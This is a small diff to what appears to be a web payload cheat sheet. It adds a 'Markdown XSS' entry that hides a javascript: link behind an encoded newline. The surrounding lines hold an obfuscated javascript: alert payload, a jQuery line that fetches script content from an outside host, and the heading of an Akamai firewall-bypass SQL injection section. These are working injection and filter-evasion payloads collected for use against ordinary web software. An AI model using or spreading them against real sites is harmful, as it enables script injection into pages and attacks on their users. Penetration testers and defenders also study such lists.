@@ -46,6 +46,12 @@ $.get('http://sakurity.com/jqueryxss')
 javas&#x09;cript://www.google.com/%0Aalert(1)
 ```
 
+**Markdown XSS**
+
+```
+[a](javascript://www.google.com%0Aprompt(1))
+```
+
 ## SQLI
 
 **Akamai Kona Bypass**
